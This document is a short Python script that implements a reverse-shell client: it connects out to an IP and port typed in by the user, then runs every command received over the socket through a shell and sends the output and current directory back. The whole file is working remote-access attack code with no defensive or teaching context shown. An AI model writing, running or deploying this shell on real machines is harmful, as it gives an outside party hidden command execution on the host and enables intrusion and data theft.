import sys
import os
import subprocess
import socket

s = socket.socket()
host = input("Enter IP address: ")
port = int(input("Enter Port: "))
s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8").strip())
    if len(data) > 0:
        process = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
        output, error = process.communicate()  # Separated stdout and stderr
        readable_output = output.decode("utf-8") + error.decode("utf-8") 
        s.sendall(readable_output.encode("utf-8") + os.getcwd().encode("utf-8") + b">")  # Fixed the send call
s.close()

